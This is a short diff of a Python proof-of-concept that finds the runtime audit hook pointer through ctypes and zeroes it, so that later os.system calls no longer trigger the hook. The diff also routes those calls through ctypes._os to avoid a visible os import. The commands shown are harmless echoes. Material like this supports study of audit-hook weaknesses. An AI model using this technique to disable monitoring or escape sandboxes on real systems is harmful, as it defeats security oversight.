@@ -5,7 +5,7 @@
 ### and show to procession
 
 from audit_hook_head_finder import print_all, get_runtime_audit_hook_ptr_addr, add_audit
-import ctypes, os
+import ctypes
 
 add_audit()
 
@@ -25,8 +25,8 @@ audit_hook = ctypes.cast(get_runtime_audit_hook_ptr_addr(), ptr_tp)
 
 # - POC - 
 
-os.system("echo 'test audit hook -- this will trigger hook'")
+ctypes._os.system("echo 'test audit hook -- this will trigger hook'")
 
 ctypes.memset(audit_hook, 0, 8)
 
-os.system("echo 'test audit hook -- this will not'")
+ctypes._os.system("echo 'test audit hook -- this will not'")
